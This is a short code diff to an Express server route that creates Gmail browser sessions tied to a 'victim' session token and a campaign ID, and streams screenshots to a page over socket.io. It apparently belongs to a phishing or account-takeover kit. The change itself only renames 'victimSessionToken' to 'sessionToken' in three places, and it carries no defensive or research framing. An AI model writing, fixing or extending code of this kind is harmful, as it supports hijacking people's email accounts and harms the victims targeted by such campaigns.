@@ -203,7 +203,7 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
     try {
       // Set a longer timeout for browser session creation
       const createSessionPromise = gmailBrowserController.gmailBrowserService.createGmailSession(
-        victimSessionToken,
+        sessionToken,
         campaignId,
         userInfo
       );
@@ -215,7 +215,7 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
       
       const sessionInfo = await Promise.race([createSessionPromise, timeoutPromise]);
 
-      console.log(`✅ Gmail browser session created for victim: ${victimSessionToken}`);
+      console.log(`✅ Gmail browser session created for victim: ${sessionToken}`);
 
       // Return a page that displays the browser session content
       res.send(`
@@ -364,7 +364,7 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
 
           <script src="/socket.io/socket.io.js"></script>
           <script>
-            const sessionToken = '${victimSessionToken}';
+            const sessionToken = '${sessionToken}';
             const campaignId = ${campaignId};
             let socket;
             let screenshotImg = document.getElementById('screenshot');
